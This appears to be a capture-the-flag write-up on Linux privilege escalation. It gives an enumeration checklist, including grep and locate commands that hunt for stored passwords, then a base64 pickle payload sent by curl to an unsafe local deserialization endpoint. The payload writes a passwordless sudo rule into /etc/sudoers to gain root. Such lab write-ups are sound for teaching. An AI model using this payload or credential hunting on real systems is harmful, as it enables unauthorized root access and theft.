# 9c550d

## LINUX PRIVILEGE ESCALATION CHECKLIST
### SYSTEM INFORMATION
- Get OS information:
- Check the path
- Check the env variables, any sensitive detail
- Search for kernel exploits such as DirtyCow
- Check if the sudo version is vulnerable
- Dmesg signature verification failed
- Check if yu have writing access to some cron job files.
- Check which services are running.


https://github.com/gurkylee/Linux-Privilege-Escalation-Basics

```bash
uname -a 
hostname 
lscpu 
ls /home 
ls /var/www/html 
ls /var/www/
ps aux | grep root 
netstat -tulpn 
ps -aux | grep root | grep mysql
ifconfig 
find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \;
locate pass | more
```

- **Basic system enumeration:** if we do `ps aux` we can see that there is a python server that exposes and endpoint:


```bash
curl http://127.0.0.1:8000/
{
    "404": "The API call you tried to make was not defined. Here's a definition of the API to help you get going :)",
    "documentation": {
        "overview": "Python server that deserializes python pickles.",
        "handlers": {
            "/deserialize": {
                "GET": {
                    "usage": "\n    Deserialize a base64 encoded python pickle.\n\n    The system auto-restarted every 15 minutes.\n    ",
                    "outputs": {
                        "format": "JSON (Javascript Serialized Object Notation)",
                        "content_type": "application/json; charset=utf-8",
                        "type": "dict() -> new empty dictionary\ndict(mapping) -> new dictionary initialized from a mapping object's\n    (key, value) pairs\ndict(iterable) -> new dictionary initialized as if via:\n    d = {}\n    for k, v in iterable:\n        d[k] = v\ndict(**kwargs) -> new dictionary initialized with the name=value pairs\n    in the keyword argument list.  For example:  dict(one=1, two=2)"
                    },
                    "inputs": {
                        "data": {
                            "type": "Basic text / string value"
                        }
                    }
                }
            }
        }
    }
}
```
If we send a pickle to this api, we will be able to execute a command with root accesses, the pickle file what does is to serialize in a pickle entity a command.
```python


```

curl "http://127.0.0.1:8000/deserialize?data=gASVVgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDtlY2hvICJyaWNoYXJkX2dpbGwgQUxMPShBTEwpIE5PUEFTU1dEOiBBTEwiID4+IC9ldGMvc3Vkb2Vyc5SFlFKULg=="

curl -G --data-urlencode "data=gASVVgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDtlY2hvICJyaWNoYXJkX2dpbGwgQUxMPShBTEwpIE5PUEFTU1dEOiBBTEwiID4+IC9ldGMvc3Vkb2Vyc5SFlFKULg==" http://127.0.0.1:8000/deserialize

curl -G --data-urlencode "data=gASVVgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDtlY2hvICJyaWNoYXJkX2dpbGwgQUxMPShBTEwpIE5PUEFTU1dEOiBBTEwiID4+IC9ldGMvc3Vkb2Vyc5SFlFKULg==" http://127.0.0.1:8000/deserialize
 
Now at this point you get root access and if you go to the root you will find the flag:
	flag{9c550d9623e1ebdf2a878b07ac437bff4508663a2e2f69}.jpg

